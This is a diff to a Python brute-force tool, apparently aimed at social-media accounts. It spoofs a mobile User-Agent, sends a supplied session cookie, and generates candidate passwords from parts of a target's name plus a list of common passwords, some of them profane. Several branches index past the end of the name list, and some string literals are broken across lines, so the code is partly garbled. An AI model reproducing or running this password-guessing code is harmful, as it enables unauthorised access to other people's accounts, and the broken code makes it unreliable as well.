@@ -13,7 +13,7 @@ class Brute(object):
 	def init(self, cookie):
 		data = {}
 		hd = {
-		"User-Agent" : "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
+		"User-Agent" : "Mozilla/5.0 (Linux; Android 8.1.0; Vivo Y93) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
 		"Cookie" : str(cookie)}
 		cookies = {
 		"Cookie " : str(cookie)}
@@ -148,6 +148,7 @@ ________________________________________________________
 	
 	def users(self, user):
 		users = user.split("_")
+		
 		if (len(users) == 2):
 			pasw = [
 				users[1]+"123",
@@ -156,6 +157,58 @@ ________________________________________________________
 		elif (len(users) == 3):
 			pasw = [
 				users[1]+"123",
+				users[1]+"1234",
+				users[2]+"123",
+				users[2]+"1234",
+				users[3]+"1234",
+				users[3]+"12345",
+			
+			
+			]
+		elif (len(users) == 4):
+			pasw = [
+				users[1]+"123",
+				users[1]+"1234",
+				users[2]+"123",
+				users[2]+"1234",
+				users[3]+"123",
+				users[3]+"1234",
+				
+				]
+		elif (len(users) == 5):
+			pasw = [
+			users[1]+"123",
+				users[1]+"1234",
+				users[2]+"123",
+				users[2]+"1234",
+				users[3]+"1234",
+				users[3]+"12345",
+				users[4]+"12345",
+				users[4]+"123456",
+				users[5]+"123456",
+				users[5]+"1234567",
+			
+			]
+		elif (len(users) == 6):
+			pasw = [
+			users[1]+"123",
+				users[1]+"1234",
+				users[2]+"123",
+				users[2]+"1234",
+				users[3]+"1234",
+				users[3]+"12345",
+				users[4]+"12345",
+				users[4]+"123456",
+				users[5]+"123456",
+				users[5]+"1234567",
+				users[6]+"1234567",
+				users[6]+"12345678",
+				
+			
+			]
+		elif (len(users) == 7):
+			pasw = [
+			users[1]+"123",
 				users[1]+"1234",
 				users[2]+"123",
 				users[2]+"1234",
@@ -171,25 +224,18 @@ ________________________________________________________
 				users[7]+"1234567890",
 			
 			]
-		elif (len(users) == 4):
-			pasw = [
-				users[1]+"123",
-				users[1]+"1234",
-				users[2]+"123",
-				users[2]+"1234",
-				users[3]+"123",
-				users[3]+"1234",
-			]
 		else:
 			pasw = [
 				'sayang', 'sayangku',
+				'sayang123','sayangku123','cintaku','cintaku123',
 				'ILOVEYOU','ILoveYou',
+				'love123','LOVE123','1234567890','123456789','
+				12345678','1234567','123456','12345,112233','ANJING','
+				KONTOL','MEMEK','anjing','kontol','memek',
+				
 				'iloveyou', 'cintaku',
 				'munafik', 'mylove',
-				'mylove123', 'cintaku','Cintaku','CINTAKU',
-'SINGAPORE','singapore',
-
-
+				'mylove123', 'myadventure',
 			]
 		return pasw
 	
